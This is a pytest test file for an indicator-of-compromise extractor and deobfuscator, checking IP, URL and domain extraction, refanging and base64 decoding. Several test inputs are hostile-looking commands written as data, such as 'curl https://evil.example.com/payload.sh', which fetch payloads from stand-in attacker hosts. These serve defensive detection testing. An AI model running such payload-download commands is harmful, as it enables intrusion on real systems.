from vigil.deobfuscator import deobfuscate
from vigil import ioc_extractor as iocx


def extract_from(text):
    root = deobfuscate(text)
    return iocx.extract(root)


def values(iocs, ioc_type=None):
    return [i.value for i in iocs if ioc_type is None or i.ioc_type == ioc_type]


def test_extracts_public_ipv4():
    # 45.0.0.0/8 is genuinely public (203.0.113.x is TEST-NET-3, which
    # Python treats as reserved and we correctly filter out).
    iocs = extract_from("connect to 45.155.205.45 now")
    assert "45.155.205.45" in values(iocs, "ipv4")


def test_filters_private_and_loopback_ips():
    iocs = extract_from("10.0.0.1 192.168.1.1 127.0.0.1 172.16.5.4")
    assert values(iocs, "ipv4") == []


def test_extracts_url_and_its_host():
    iocs = extract_from("curl https://evil.example.com/payload.sh")
    assert "https://evil.example.com/payload.sh" in values(iocs, "url")
    assert "evil.example.com" in values(iocs, "domain")


def test_refangs_defanged_url():
    iocs = extract_from("hxxps://bad[.]example[.]com/x")
    urls = values(iocs, "url")
    assert any("https://bad.example.com/x" == u for u in urls)
    assert any(i.defanged for i in iocs)


def test_refangs_defanged_ip():
    iocs = extract_from("beacon to 45[.]155[.]205[.]7")
    assert "45.155.205.7" in values(iocs, "ipv4")


def test_domain_noise_filtered():
    # version-like and filename-like dotted tokens should not be domains
    iocs = extract_from("using config.json and version 1.2.3 here")
    assert "config.json" not in values(iocs, "domain")
    assert "1.2.3" not in values(iocs, "domain")


def test_provenance_records_layer_id():
    import base64
    payload = "curl http://evil.example.com/deep"
    blob = base64.b64encode(payload.encode()).decode()
    iocs = extract_from(blob)
    url_iocs = [i for i in iocs if i.ioc_type == "url"]
    assert url_iocs
    # the URL was found in a decoded (non-root) layer
    assert any(h.layer_id > 0 for i in url_iocs for h in i.hits)


def test_dedup_same_ioc_multiple_layers():
    import base64
    payload = "http://evil.example.com/x http://evil.example.com/x"
    blob = base64.b64encode(payload.encode()).decode()
    iocs = extract_from(blob)
    matches = [i for i in iocs if i.value == "http://evil.example.com/x"]
    assert len(matches) == 1  # deduped


def test_hostile_input_does_not_crash():
    for bad in ["", "http://", "999.999.999.999", "..." * 100, "@@@", "http://[::]"]:
        extract_from(bad)  # must not raise
